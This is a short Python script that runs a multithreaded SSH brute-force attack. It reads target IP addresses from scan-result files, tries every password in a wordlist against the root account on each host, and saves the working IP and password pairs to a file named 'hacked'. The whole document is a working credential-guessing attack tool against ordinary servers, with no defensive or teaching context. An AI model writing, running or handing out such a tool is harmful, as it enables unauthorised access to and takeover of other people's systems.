from pexpect import pxssh
import sys
import threading
import glob

class bruteThread (threading.Thread):
    def __init__(self, threadId, numThreads):
        threading.Thread.__init__(self)
        self.threadId = threadId
        self.numThreads = numThreads
    def run(self):
        brute(self.threadId, self.numThreads)

def brute(threadId, numThreads):

    passwords = open("wordlist", "r")
    hackedSSHs = open("hacked", "w")
    for password in passwords:
        for i in range(threadId, len(IPs), numThreads):
            ip = IPs[i]
            s = pxssh.pxssh(timeout=5)
            try:
                s.login(ip, "root", password.strip())
                hackedSSHs.write(ip + "------" + password.strip() + "\n")
                hackedSSHs.flush()
                print(ip + "-------" + password + "logged in!!")
            except:
                print(ip + "-------" + password +"wrong password")
    hackedSSHs.close()

try:
    openIPs = []
    IPs = []
    for f in glob.glob('open-*'):
        openIPs.append(f)
        print(f)

    for name in openIPs:
        with open(name) as s:
            IPs.extend(s.readline().splitlines())


    threadList = []
    numThreads = int(sys.argv[1])
    for i in range(numThreads):
        threadList.append(bruteThread(i, numThreads))
        threadList[i].start()
except Exception as e:
    print(e)
    print("Usage: python3 brute.py NUM_THREADS")